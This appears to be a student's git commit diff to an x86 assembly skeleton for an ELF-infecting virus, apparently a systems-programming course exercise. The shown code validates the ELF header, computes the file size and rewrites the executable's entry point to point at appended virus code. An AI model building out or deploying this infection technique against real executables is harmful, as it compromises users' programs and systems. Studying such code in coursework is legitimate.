cd8de67496c6fd8498ed78270706f597ddd96fdc
omerbinyamin4 <benjomer@post.bgu.ac.il>
2021-06-12 17:13:28 +0300

    edads

--- skeleton.s
+++ skeleton.s
@@ -87,8 +87,6 @@ read eax, ebp, 80				; reads 80bytes from file of file descriptor(eax) into the 
 mov esi, ebp					; store header in esi
 add ebp, 84						; clean header from the stack
 
-
-
 ; check the file is ELF file
 mov ebx, esi
 inc ebx
@@ -101,32 +99,40 @@ inc ebx
 cmp byte [ebx], 70				; cmp e_ident[3] with 'F'
 jne printErr
 
-; find the size of the file, in order to use it as offset when writing virus
-mov eax, dword [ebp-4]          ; load file descriptor from stak
-lseek eax, 0, SEEK_END
-mov dword [ebp-16], eax			;store file zise on stack 
-
-; seek location of program headers
 mov eax, dword [ebp-4]
 lseek eax, 52, SEEK_SET
 
-; load program headers
-sub ebp, 44						; make room for program headers
-mov eax, dword	[ebp-4]
-read eax, ebp, 32				; reads 32bytes from file of file descriptor(eax) into the stack as a buffer (ebp)
-mov edi, ebp					; store program headers in esi
-add ebp, 44						; clean program headers from the stack
+mov edi, ebp
+sub edi, 200
+mov eax, dword [ebp-4]
+read eax, edi, 32
+mov edx, dword [edi+8]
+mov dword [ebp-8], edx
+mov edx, 0
 
-add edi, 4						; move to virtual adress of the first entry in the program headers
-mov dword ebx, [edi]			; move to ebx the virtual adress which the file is loaded to in the memory
-add ebx, [ebp-16]				; add the the virtual adress the size of the file
+
+; load program headers
+;sub ebp, 40						; make room for program headers
+;mov eax, dword [ebp-4]
+;read eax, ebp, 32				; reads 32bytes from file of file descriptor(eax) into the stack as a buffer (ebp)
+;mov edi, ebp
+;add ebp, 40
+
+
+; find the size of the file, in order to use it as offset when writing virus
+mov eax, dword [ebp-4]          ; load file descriptor from stak
+lseek eax, 0, SEEK_END
+mov dword [ebp-12], eax			;store file zise on stack 
+
+mov ebx, [ebp-8]				; get virtual adress
+add ebx, [ebp-12]				; change virtual adress to the adress of the end of the file (at runtime)
 
 ; change entry point
 mov eax, dword [ebp-4]			; get file descriptor
-test:
-lseek eax, 24, SEEK_SET			; get location of entry point address
+mov dword [esi + 24], ebx
+lseek eax, 0, SEEK_SET			; get location of entry point address
 mov eax, dword [ebp-4]
-write eax, ebx, 4				; write the new address to instead of the old entry point file
+write eax, esi, 52				; write the new address to instead of the old entry point file
 
 
 ; write the virus to the end of the file
